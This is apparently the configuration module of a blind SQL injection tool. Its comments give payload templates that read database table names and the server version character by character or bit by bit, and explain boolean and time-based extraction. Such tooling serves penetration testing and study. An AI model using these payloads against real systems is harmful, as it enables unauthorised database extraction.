#Version 2022-03-28
class Configuration(dict):
    def __init__(self):
        """ Payload requires some attributes in order for it to work.
                Both:
                    {charIndex}:
                        Mandatory. Character index of a string. Example: `SUBSTRING(...,{charIndex},1)`
                    {offsetIndex}:
                        Mandatory. Offset of the row. Example: `LIMIT {offsetIndex}, 1`

                ASCII:
                    {ascii}:
                        Mandatory. Minimum inclusive ASCII value. 32 if printable only, else 0. Example: `ASCII(...)>={ascii}`
                    {max}:
                        Optional. Maximum inclusive ASCII value. 126 if printable only, else 255. Example: `ASCII(...) BETWEEN {ascii} AND {max}`

                    Example: 
                        With multiple rows: `ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {offsetIndex},1),{charIndex},1))>={ascii}`
                        With one row:       `ASCII(SUBSTRING((SELECT @@version),{charIndex},1))>={ascii}`

                Binary:
                    {bitIndex}:
                        Mandatory. Bit index of a character. Example: `SUBSTRING(REVERSE(BIN(ASCII(SUBSTRING(...)))),{bitIndex},1)=1`

                    Example: 
                        With mulitple rows: `SUBSTRING(REVERSE(BIN(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {offsetIndex},1),{charIndex},1)))),{bitIndex},1)=1`
                        With one row:       `SUBSTRING(REVERSE(BIN(ASCII(SUBSTRING((SELECT @@version),{charIndex},1)))),{bitIndex},1)=1`

            To know where to inject the payload, the URL or the data must contain the keywork {payload}.
                Example: `url = http://127.0.0.1/?id={payload}`
                Example: `data = {"id":"{payload}"}`
        """
        self.payload = ""
        
        # Request Method (handles what the module requests can handle).
        self.method = "get".lower()

        # URL
        # Example: `http://127.0.0.1/?id={payload}`
        self.url = ""

        """
            POST data in many format.
                URL encoded: `{"id":"{payload}"}`
                JSON: `{"queries":[{"id":"{payload}"}]}`
                XML: `"<element>{payload}</element>"`
                Multipart/form-data: `{"parameterName":("fileName","{payload}")}` or `{"parameterName":(None,"{payload}")}` or `{"parameterName":"{payload}"}`
        """
        self.data = {}

        """
            - JSON: [application/json or json]
            - Multipart/form-data: [multipart/form-data or multipart or form-data].
            - XML: If you need XML, you must add the header for it and keep this variable empty. Example: `kwargs["requests"]["headers"] = {"Content-Type":"application/xml"}`.
            - Empty or anything else reverts to application/x-www-form-urlencoded.
            
            Important note:
                This variable is only used to determine which parameter to use for the requests call (data, json or files). It is not sent has an header.
        """
        self.contentType = ""

        # If you want to count the number of rows prior extracting them, use the following parameter. However, it may not work properly and increase the duration of the script.
        # Example: `(select count(table_name) from information_schema.tables)>{ascii}`
        self.countRows = "" 
        
        # If you want to find the length of the word to extract prior extracting it, use the following parameter. However, it may not work properly and increase the duration of the script.
        # Example: `(select length(@@version))>{ascii}`
        self.findLength = "" 

        # minAscii and maxAscii are INCLUSIVE. Meaning that your payload must use GREATER THAN {ascii}.
        self.minAscii = 32
        self.maxAscii = 126

        # Amount of bits to read from a binary search. 7 if you search for only printables (lower than 128), 8 if your charset is bigger than 127.
        self.binaryLength = 7
        
        # True if you want to use binary instead of ASCII (False)
        self.useBinary = False

        # Sleep in second between each request. This is mostly used to slow down the script.
        self.sleep = 0

        # The following parameter is used if you want to use boolean. The value of the parameter will be evaluated in order to know if it is true where `r` is the object containing the result of the requests.
        # Example: `"Found" in r.text` 
        # Example: `1 == r.json()["results"][0]["id"]`
        self.evalCondition = ""
        
        # True if you want to use time instead of boolean (False)
        self.timeBased = False

        # Requests parameters.
        #   verify: validate SSL/TLS certificates.
        #   allow_redirects: follow HTTP status 302.
        #   proxies: Example: `{"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}`
        #
        #   For more information, https://docs.python-requests.org/en/latest/.
        self.requests = {}
        self.requests["verify"] = False
        self.requests["allow_redirects"] = False
        self.requests["cookies"] = {}
        self.requests["headers"] = {}
        self.requests["proxies"] = {}


    ################################
    # Default dictionary functions #
    ################################

    def __setitem__(self, key, item):
        self.__dict__[key] = item

    def __getitem__(self, key):
        return self.__dict__[key]

    def __repr__(self):
        return repr(self.__dict__)

    def __len__(self):
        return len(self.__dict__)

    def __delitem__(self, key):
        del self.__dict__[key]

    def clear(self):
        return self.__dict__.clear()

    def copy(self):
        return self.__dict__.copy()

    def has_key(self, k):
        return k in self.__dict__

    def update(self, *args, **kwargs):
        return self.__dict__.update(*args, **kwargs)

    def keys(self):
        return self.__dict__.keys()

    def values(self):
        return self.__dict__.values()

    def items(self):
        return self.__dict__.items()

    def pop(self, *args):
        return self.__dict__.pop(*args)

    def __cmp__(self, dict_):
        return self.__cmp__(self.__dict__, dict_)

    def __contains__(self, item):
        return item in self.__dict__

    def __iter__(self):
        return iter(self.__dict__)

    def __unicode__(self):
        return unicode(repr(self.__dict__))